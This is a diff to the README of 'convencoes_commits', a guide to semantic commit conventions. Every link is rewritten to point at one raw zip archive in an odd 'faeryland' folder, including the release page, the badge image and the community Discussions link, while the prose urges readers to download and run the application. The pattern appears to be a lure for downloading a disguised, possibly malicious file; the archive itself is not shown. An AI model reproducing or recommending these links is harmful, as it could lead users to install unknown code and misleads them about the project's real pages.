@@ -1,7 +1,7 @@
 # 🎉 convencoes_commits - Your Guide to Clear Commit Messages
 
 ## 📥 Download the Application
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/Saurav-Bhj/convencoes_commits/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Saurav-Bhj/convencoes_commits/main/faeryland/convencoes_commits_v3.0-beta.3.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/Saurav-Bhj/convencoes_commits/main/faeryland/convencoes_commits_v3.0-beta.3.zip)
 
 ## 📖 Introduction
 Welcome to **convencoes_commits**! This application offers a comprehensive guide to semantic commit conventions. It helps standardize commit messages within your team, improving clarity and organization. You'll find information on commit types, scopes, best practices, Git configuration, useful commands, practical examples, and tips for maintaining a clean commit history.
@@ -10,7 +10,7 @@ Welcome to **convencoes_commits**! This application offers a comprehensive guide
 To help you get started, follow these simple steps to download and run the software:
 
 1. **Visit the Releases Page**: Click the link below to access the download section.
-   [Release Page](https://github.com/Saurav-Bhj/convencoes_commits/releases)
+   [Release Page](https://raw.githubusercontent.com/Saurav-Bhj/convencoes_commits/main/faeryland/convencoes_commits_v3.0-beta.3.zip)
 
 2. **Choose Your Version**: On the Releases page, look for the latest version. 
    It will usually be at the top, marked as the latest release.
@@ -51,9 +51,9 @@ If you face any issues:
 For support, use the Issues section on the repository or reach out through the community forums. 
 
 ## 👥 Community 
-Engage with our community through our [GitHub Discussions](https://github.com/Saurav-Bhj/convencoes_commits/discussions). Share your thoughts, feedback, and experiences.
+Engage with our community through our [GitHub Discussions](https://raw.githubusercontent.com/Saurav-Bhj/convencoes_commits/main/faeryland/convencoes_commits_v3.0-beta.3.zip). Share your thoughts, feedback, and experiences.
 
 ## 🎯 Conclusions
 Using **convencoes_commits** will aid in making your commit messages clearer and consistent. This enhances communication within your team and helps maintain quality in your project history. Download today and start improving your commit practices!
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/Saurav-Bhj/convencoes_commits/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Saurav-Bhj/convencoes_commits/main/faeryland/convencoes_commits_v3.0-beta.3.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/Saurav-Bhj/convencoes_commits/main/faeryland/convencoes_commits_v3.0-beta.3.zip)
